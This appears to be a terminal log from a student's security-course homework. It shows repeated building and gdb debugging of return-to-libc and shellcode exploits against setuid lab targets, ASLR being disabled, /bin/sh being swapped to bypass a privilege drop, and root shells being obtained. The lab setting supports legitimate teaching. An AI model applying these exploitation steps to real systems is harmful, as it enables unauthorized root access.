student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
execve failed.
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
process 2074 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 2 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 2, foo (
    temp=0xbfffff9a "AAAAAAAAp&\345\267[\205\004\b\242\377\377\277p&\345\267[\205\004\b\242\377\377\277\242\377\377\277\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\354\375\377\277")
    at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffe10
 source language c.
 Arglist at 0xbffffdfc, args: 
    temp=0xbfffff9a "AAAAAAAAp&\345\267[\205\004\b\242\377\377\277p&\345\267[\205\004\b\242\377\377\277\242\377\377\277\242\377\377\277\200\232\353\267\320y㷱\377\377\277\261\377\377\277\354\375\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7e52670 <__printf>
(gdb) p setuid
$2 = {<text variable, no debug info>} 0xb7eba2e0 <__setuid>
(gdb) p/x getenv("s")
$3 = 0xbfffffe7
(gdb) p/x getenv("t")
$4 = 0xbfffffd9
(gdb) p/x getenv("j")
$5 = 0xbfffffe0
(gdb) x/64x 0xbffffdfc-128
0xbffffd7c:	0xb7e7a3d1	0x00000002	0x00000002	0xb7ff212a
0xbffffd8c:	0xb7e3710c	0x0804b028	0xb7fff918	0xb7e7a23b
0xbffffd9c:	0xb7fff000	0xb7fbb000	0xb7fbb000	0xbffffdcc
0xbffffdac:	0x00000001	0x00000008	0x00000002	0xb7e370f9
0xbffffdbc:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffdcc
0xbffffdcc:	0xbffffdef	0x0804b028	0x00000000	0xb7e37a50
0xbffffddc:	0x0804854b	0x00000002	0xbffffea4	0xbffffeb0
0xbffffdec:	0xcc048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffdfc:	0xbffffe08	0x080484e8	0xbfffff9a	0x00000000
0xbffffe0c:	0xb7e21637	0x00000002	0xbffffea4	0xbffffeb0
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffe2c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe3c:	0xb7fbb000	0x00000000	0x741ba357	0x4fcc6d47
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe5c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe6c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) n
11	}
(gdb) x/64x 0xbffffdfc-128
0xbffffd7c:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffd8c:	0xb7e3710c	0xb7e7df95	0xb7fe996a	0xb7e7a23b
0xbffffd9c:	0xb7fff000	0xb7fff000	0x08048250	0xbffffdcc
0xbffffdac:	0x00000001	0x00000008	0xb7e0d598	0xb7e370f9
0xbffffdbc:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffdcc:	0xb7fbb000	0xbffffdfc	0xb7ff0010	0xbffffe34
0xbffffddc:	0xb7e8fe10	0xbffffdf8	0x00000000	0xb7fbb000
0xbffffdec:	0x080484ad	0xbffffdf8	0xbfffff9a	0x41414141
0xbffffdfc:	0x41414141	0xb7e52670	0x0804855b	0xbfffffa2
0xbffffe0c:	0xb7e52670	0x0804855b	0xbfffffa2	0xbfffffa2
0xbffffe1c:	0xbfffffa2	0xb7eb9a80	0xb7e379d0	0xbfffffb1
0xbffffe2c:	0xbfffffb1	0xbffffdec	0x00000000	0xb7fbb000
0xbffffe3c:	0xb7fbb000	0x00000000	0x741ba357	0x4fcc6d47
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe5c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe6c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) x/x 0xbffffe2d0
0xffffe2d0:	Cannot access memory at address 0xffffe2d0
(gdb) x/x 0xbffffe30
0xbffffe30:	0xbffffdec
(gdb) q
A debugging session is active.

	Inferior 1 [process 2074] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdp -q sploitEC
No command 'gdp' found, but there are 16 similar ones
gdp: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploitEC
Reading symbols from sploitEC...done.
(gdb) break main
Breakpoint 1 at 0x80484fd: file sploitEC.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploitEC 

Breakpoint 1, main () at sploitEC.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
process 2309 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 2 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 2, foo (
    temp=0xbfffff96 "AAAAAAAAp&\345\267[\205\004\b\331\377\377\277p&\345\267[\205\004\b\340\377\377\277\340\242\353\267[\205\004\b \376\377\277\200\232\353\267\320y\343\267\347\377\377\277\347\377\377\277\064\376\377\277") at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffe10
 source language c.
 Arglist at 0xbffffdfc, args: 
    temp=0xbfffff96 "AAAAAAAAp&\345\267[\205\004\b\331\377\377\277p&\345\267[\205\004\b\340\377\377\277\340\242\353\267[\205\004\b \376\377\277\200\232\353\267\320y\343\267\347\377\377\277\347\377\377\277\064\376\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) p/x getenv("s")
$1 = 0xbfffffe7
(gdb) p/x getenv("j")
$2 = 0xbfffffe0
(gdb) p/x getenv("t")
$3 = 0xbfffffd9
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffe10
 source language c.
 Arglist at 0xbffffdfc, args: 
    temp=0xbfffff96 "AAAAAAAAp&\345\267[\205\004\b\331\377\377\277p&\345\267[\205\004\b\340\377\377\277\340\242\353\267[\205\004\b \376\377\277\200\232\353\267\320y\343\267\347\377\377\277\347\377\377\277\064\376\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) x/64x 0xbffffdfc-128
0xbffffd7c:	0xb7e7a3d1	0x00000002	0x00000002	0xb7ff212a
0xbffffd8c:	0xb7e3710c	0x0804b028	0xb7fff918	0xb7e7a23b
0xbffffd9c:	0xb7fff000	0xb7fbb000	0xb7fbb000	0xbffffdcc
0xbffffdac:	0x00000001	0x00000008	0x00000002	0xb7e370f9
0xbffffdbc:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffdcc
0xbffffdcc:	0xbffffdef	0x0804b028	0x00000000	0xb7e37a50
0xbffffddc:	0x0804854b	0x00000002	0xbffffea4	0xbffffeb0
0xbffffdec:	0xcc048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffdfc:	0xbffffe08	0x080484e8	0xbfffff96	0x00000000
0xbffffe0c:	0xb7e21637	0x00000002	0xbffffea4	0xbffffeb0
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffe2c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe3c:	0xb7fbb000	0x00000000	0x6f8354df	0x54549acf
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe5c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe6c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) n
11	}
(gdb) x/64x 0xbffffdfc-128
0xbffffd7c:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffd8c:	0xb7e3710c	0xb7e7df95	0xb7fe996a	0xb7e7a23b
0xbffffd9c:	0xb7fff000	0xb7fff000	0x08048250	0xbffffdcc
0xbffffdac:	0x00000001	0x00000008	0xb7e0d598	0xb7e370f9
0xbffffdbc:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffdcc:	0xb7fbb000	0xbffffdfc	0xb7ff0010	0xbffffe34
0xbffffddc:	0xb7e8fe10	0xbffffdf8	0x00000000	0xb7fbb000
0xbffffdec:	0x080484ad	0xbffffdf8	0xbfffff96	0x41414141
0xbffffdfc:	0x41414141	0xb7e52670	0x0804855b	0xbfffffd9
0xbffffe0c:	0xb7e52670	0x0804855b	0xbfffffe0	0xb7eba2e0
0xbffffe1c:	0x0804855b	0xbffffe20	0xb7eb9a80	0xb7e379d0
0xbffffe2c:	0xbfffffe7	0xbfffffe7	0xbffffe34	0xb7fbb000
0xbffffe3c:	0xb7fbb000	0x00000000	0x6f8354df	0x54549acf
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe5c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe6c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) x.x 0xbffffe34
A syntax error in expression, near `.x 0xbffffe34'.
(gdb) x/x 0xbffffe34
0xbffffe34:	0xbffffe34
(gdb) x/x 0xbffffe20
0xbffffe20:	0xbffffe20
(gdb) q
A debugging session is active.

	Inferior 1 [process 2309] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
/bin/sh: 0: Can't open 4???
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
/bin/sh: 0: Can't open 4???
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploitEC
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

295 packages can be updated.
224 updates are security updates.

Last login: Tue Nov  5 20:22:26 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls -la /bin/sh
lrwxrwxrwx 1 root root 4 Nov  5 19:19 /bin/sh -> dash
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ ls
demo  Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  gdb.log  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitX.c -o sploit0 ; echo whoami | ./sploit0
gcc: error: sploitX.c: No such file or directory
gcc: fatal error: no input files
compilation terminated.
-bash: ./sploit0: No such file or directory
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0 ; echo whoami | ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1 ; echo whoami | ./sploit1
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2 ; echo whoami | ./sploit2
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3 ; echo whoami | ./sploit3
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4 ; echo whoami | ./sploit4
student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC ; echo whoami | ./sploitEC
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install zsh; sudo rm /bin/sh; sudo ln -s /bin/zsh /bin/sh
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  zsh-common
Suggested packages:
  zsh-doc
The following NEW packages will be installed:
  zsh zsh-common
0 upgraded, 2 newly installed, 0 to remove and 293 not upgraded.
Need to get 3,853 kB of archives.
After this operation, 14.1 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 zsh-common all 5.1.1-1ubuntu2.3 [3,182 kB]
Get:2 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 zsh i386 5.1.1-1ubuntu2.3 [671 kB]
Fetched 3,853 kB in 1s (2,271 kB/s)
Selecting previously unselected package zsh-common.
(Reading database ... 181539 files and directories currently installed.)
Preparing to unpack .../zsh-common_5.1.1-1ubuntu2.3_all.deb ...
Unpacking zsh-common (5.1.1-1ubuntu2.3) ...
Selecting previously unselected package zsh.
Preparing to unpack .../zsh_5.1.1-1ubuntu2.3_i386.deb ...
Unpacking zsh (5.1.1-1ubuntu2.3) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up zsh-common (5.1.1-1ubuntu2.3) ...
Setting up zsh (5.1.1-1ubuntu2.3) ...
update-alternatives: using /bin/zsh5 to provide /bin/zsh (zsh) in auto mode
update-alternatives: using /bin/zsh5 to provide /bin/rzsh (rzsh) in auto mode
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /bin/sh
lrwxrwxrwx 1 root root 8 Dec  2 18:07 /bin/sh -> /bin/zsh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4 ; echo whoami | ./sploit4
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploitEC.c -o sploitEC ; echo whoami | ./sploitEC
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ exit
logout
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % 
